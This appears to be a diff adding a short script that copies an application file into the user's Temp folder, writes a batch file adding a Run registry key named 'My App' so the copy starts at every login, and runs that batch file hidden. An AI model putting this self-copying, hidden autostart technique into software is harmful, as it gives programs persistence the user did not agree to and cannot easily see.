@@ -1,0 +1,15 @@
+string$=<Temp>
+substring$='\Temp\\'
+RetVal=POS(substring$,string$)+1
+localSystemDirectory$=StrCopy(string$,0,RetVal)
+currentRoot$='<SrcDir>\\'+CBK_AppFileName
+dest$ = localSystemDirectory$+CBK_AppFileName
+FileExist("dest$","check")
+If (check=1) Then
+Else
+  SysCommand("CopyFile","currentRoot$,dest$")
+End
+batFile$=localSystemDirectory$+CBK_AppFileName+'.bat'
+regString$= 'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "My App" /t REG_SZ /F /D '+'"'+dest$+'"'
+ReturnVal=StrToFile(batFile$,regString$,FALSE,FALSE)
+Run("batFile$","HIDE")
